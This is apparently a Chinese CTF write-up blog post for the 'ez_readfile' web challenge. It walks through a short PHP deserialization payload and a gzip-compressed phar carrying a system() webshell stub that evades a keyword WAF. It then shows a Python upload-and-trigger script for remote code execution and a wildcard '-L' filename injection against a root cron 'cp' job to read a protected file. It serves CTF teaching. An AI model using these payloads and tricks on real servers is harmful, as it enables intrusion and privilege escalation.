---
title: "CTF Web 进阶三题（三）—— ez_readfile：phar.gz 绕 waf + cp 参数注入"
date: "2026-10-25"
tags: ["Security", "CTF", "Web"]
excerpt: "unserialize 入口只有 52 字符，waf 又封了 phar 关键字。把 phar 压成 gzip 绕过，再用 cp 的 -L 参数注入把 root 的 flag 复制出来。"
series: "ctf-web-advanced"
seriesOrder: 3
---

> 题目：2025 湾区杯网络安全大赛 · Web · ez_readfile（NSSCTF 复现）
> 环境：PHP 7.4.33 / Apache 2.4.54 (Debian)
> 考点：短序列化链、phar 反序列化、gzip 绕过关键字、`cp` 参数注入、软链接

---

## 一、源码

```php
<?php
highlight_file(__FILE__);

function waf($data){
    if (is_array($data)){
        die("Cannot transfer arrays");
    }
    if (preg_match('/<\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i', $data)) {
        die("You can't do");
    }
}

class Coral{
    public $pivot;
    public function __set($k, $value) {
        $k = $this->pivot->ctor;
        echo new $k($value);
    }
}

class Nimbus{
    public $handle;
    public $ctor;
    public function __destruct() {
        return $this->handle();
    }
    public function __call($name, $arg){
        $arg[1] = $this->handle->$name;
    }
}

class Zephyr{
    public $target;
    public $payload;
    public function __get($prop)
    {
        $this->target->$prop = $this->payload;
    }
}

class Acheron {
    public $mode;
    public function __destruct(){
        $data = $_POST[0];
        if ($this->mode == 'w') {
            waf($data);
            $filename = "/tmp/".md5(rand()).".phar";
            file_put_contents($filename, $data);
            echo $filename;
        } else if ($this->mode == 'r') {
            waf($data);
            $f = include($data);
            if($f){ echo "It is file"; }
            else{ echo "You can look at the others"; }
        }
    }
}

if(strlen($_POST[1]) < 52) {
    $a = unserialize($_POST[1]);
}
else{
    echo "str too long";
}
?>
```

## 二、分诊

三个关键事实：

1. **入口极短**：`$_POST[1]` 反序列化，但必须 `< 52` 字符。
2. **waf 只检查 `$_POST[0]`**，不检查 `$_POST[1]`——所以序列化串里可以随便写类名。
3. `Acheron` 是唯一有实际 IO 的类：`mode=w` 写文件（路径固定 `/tmp/<md5>.phar`），`mode=r` 直接 `include($_POST[0])`。

最短 payload 就是：

```
O:7:"Acheron":1:{s:4:"mode";s:1:"r";}      # 37 字符
```

先拿它当文件包含用：

```http
POST /
0=/etc/passwd
1=O:7:"Acheron":1:{s:4:"mode";s:1:"r";}
```

能读到 `/etc/passwd`，说明 include 通道成立。

## 三、卡点：/flag 读不了

```http
0=/flag
```

返回：

```
include(/flag): failed to open stream: Permission denied
```

`ls -la /` 看到：

```
-r--------   1 root root   44 Oct 25 09:31 flag
```

`0400 root`，www-data 读不了。所以**不能直接包含**，必须拿到代码执行。

## 四、phar + gzip：绕过 waf 写马

### 4.1 为什么直接写 phar 不行

正常思路是 `mode=w` 写一个 phar（stub 里放马），再 `mode=r` 包含触发。但 waf 把关键字符串全 ban 了：

- `<?` → stub 开头就死
- `__HALT_COMPILER` → phar 必需
- `php` → 任何 `<?php` 都死
- `Coral|Nimbus|Zephyr|Acheron|ctor|payload` → 序列化元数据全死

写进去的文件必然带这些明文，过不了 waf。

### 4.2 include 一个 `.phar` 时 PHP 做了什么

这是这题最核心的知识点：

```
include($file)
  → zend_compile_file()
    → strstr(filename, ".phar")        ← 只看文件名
      → phar_open_from_filename()
        → phar_open_from_fp()          ← 解析并解压
          → 执行 phar 的 stub
```

两个推论：

1. **只看文件名**：只要路径里含 `.phar` 就会走 phar 解析，跟真实内容是不是 phar 无关。
2. **会自动解压**：phar 支持 gzip 压缩格式，`phar_open_from_fp` 遇到 gzip 会先解压再解析。

### 4.3 gzip 压掉关键字

把 phar 用 gzip 压一遍，明文关键字在字节流里就消失了：

```
phar 151 B  →  gz 148 B
  gz 中 "<?":            False
  gz 中 "__HALT_COMPILER": False
  gz 中 "php":            False
```

waf 检查的是原始字节，压缩后全部通过。

### 4.4 生成 phar

```php
<?php
// php -d phar.readonly=0 build_phar.php exp.phar
$p = new Phar($argv[1]);
$p->startBuffering();
$p->setStub('<?php system($_POST["cmd"]); __HALT_COMPILER(); ?>');
$p->addFromString('a.txt', 'aaaa');
$p->stopBuffering();
```

stub 直接写 `system($_POST["cmd"])`，这样每次 include 都带命令执行，不用额外写 webshell。

再 gzip：

```python
import gzip
gz = gzip.compress(open('exp.phar','rb').read(), 9)
```

## 五、RCE

```python
# 1) 写 gz 到 /tmp/<md5>.phar
r = requests.post(BASE,
                  data={'1': 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}'},
                  files={'0': (None, gz)})
path = re.search(r'/tmp/[0-9a-f]{32}\.phar', r.text).group(0)

# 2) include 它，触发 stub
r = requests.post(BASE,
                  data={'1': 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}',
                        'cmd': 'id'},
                  files={'0': (None, path)})
```

返回：

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
It is file
```

`It is file` 说明 include 返回值非空（stub 执行完返回 1），RCE 成立。

## 六、读 flag：cp 参数注入

### 6.1 backup.sh

`/var/www/html` 下有个脚本被 root 循环执行：

```bash
cp -P * /var/www/html/backup/
chmod 755 -R /var/www/html/backup/
sleep 10
```

- `-P`：**不**跟随软链接（只复制链接本身）
- 每 10 秒执行一次，目标目录 `backup` 是 root 所有，但我们能读

### 6.2 思路

如果能让 `cp` 变成跟随软链接（`-L`），那么 `flag -> /flag` 这个软链接就会被复制成**真实文件内容**，且随后 `chmod 755`，就能读了。

问题：怎么改 `cp -P` 的参数？

### 6.3 `*` 展开 + 参数覆盖

shell 展开 `*` 时，会把当前目录下所有非隐藏文件按**字母序**列出来。`-` 的 ASCII 是 `0x2D`，排在字母和数字前面。

所以只要在当前目录建一个名字叫 `-L` 的文件：

```
-L
backup
backup.sh
flag
index.php
```

`cp -P * /var/www/html/backup/` 展开成：

```
cp -P -L backup backup.sh flag index.php /var/www/html/backup/
```

Linux 命令参数**后来者胜**，`-P` 被后面的 `-L` 覆盖 → cp 跟随软链接 → `/flag` 的真实内容被复制到 `backup/flag`，再 `chmod 755`。

### 6.4 执行

```bash
cd /var/www/html
touch ./-L          # 文件名就是 -L（必须用 ./ 前缀，否则被当成参数）
ln -s /flag flag    # 软链接
```

等 10 秒：

```bash
ls -la backup
-rwxr-xr-x 1 root root 44 flag
cat backup/flag
```

拿到 flag。

## 七、完整流程

```
1. POST mode=r, 0=/etc/passwd            → 验证 include 可用
2. php -d phar.readonly=0 生成 exp.phar  → gzip 成 exp.phar.gz
3. POST mode=w, 0=<gz 字节>              → 得到 /tmp/<md5>.phar
4. POST mode=r, 0=<path>, cmd=id         → RCE
5. cmd: cd /var/www/html && touch ./-L && ln -s /flag flag
6. 等 10 秒
7. cmd: cat /var/www/html/backup/flag    → flag
```

flag：

```
NSSCTF{6588c919-c331-438c-a1b5-3b31c1f322da}
```

## 八、踩坑

| # | 现象 | 原因 | 解决 |
|---|---|---|---|
| 1 | `str too long` 一直出现 | 用 `curl --data-urlencode` 时 `;` 没被编码，PHP 按 `;` 拆了 POST | 换 Python `requests`，或手动编码 `%3B` |
| 2 | Windows 上 `new Phar()` 报 `unable to create temporary file` | 没指定 temp 目录 | `php -d sys_temp_dir=... -d phar.readonly=0` |
| 3 | gz 上传后 include 没反应 | 路径里没有 `.phar` | 文件名必须是 `/tmp/xxx.phar`（这题固定） |
| 4 | 写了 phar 但 include 执行的是乱码 | 没压缩，waf 不过 / 或 stub 写错 | 确认 gz 里无关键字，stub 以 `<?php` 开头 |
| 5 | `touch -L` 报错 | `-L` 被当成参数 | 用 `touch ./-L` |
| 6 | 等 10 秒后 backup 里还是没有 flag | 软链接没建 / `-L` 文件没建 | `ls -la` 确认两者都在 |

## 九、两个可复用的 trick

### 9.1 压缩绕过关键字

**只要过滤发生在"文件内容"层，而解析发生在"解压后"层，就可以用压缩绕过。**

- phar + gzip（本题）
- zip + `zip://`
- 图片马 + 二次渲染（另一种思路）

判断条件：

1. 能不能控制写入的字节？
2. 落地后有没有一个"会自动解压/解析"的消费方？
3. 关键字在压缩后是否确实消失？（要实际验证，不能想当然）

### 9.2 `cp` 参数注入

`cp -X * dest/` 这种写法，只要能在目录里放一个以 `-` 开头的文件，就能覆盖前面的参数。

- `-L`：跟随软链接 → 读 root 文件
- `-r`：递归 → 复制目录
- `--no-preserve=...`：改权限行为

配合"定时备份脚本"这类 root 循环任务，就是一个稳定的提权链。

## 相关

- 题解：<https://www.cnblogs.com/Acc1oFl4g/p/19092325>
